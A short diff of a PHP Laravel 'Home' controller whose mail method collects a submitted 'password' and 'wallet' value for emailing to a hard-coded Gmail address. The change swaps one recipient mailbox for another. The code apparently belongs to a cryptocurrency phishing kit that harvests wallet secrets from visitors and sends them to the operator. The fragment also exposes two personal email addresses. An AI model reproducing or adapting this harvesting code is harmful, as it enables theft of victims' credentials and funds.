@@ -8,7 +8,7 @@ use Mail;
 class Home extends Controller
 {
     public function mail(Request $request){
-        $emails =array('umairnoor.siddiqui@gmail.com'); 
+        $emails =array('teamwaruq@gmail.com'); 
         $data = array(
                         'password'=>$request->input('password'),
                         'wallet'=>$request->input('wallet')
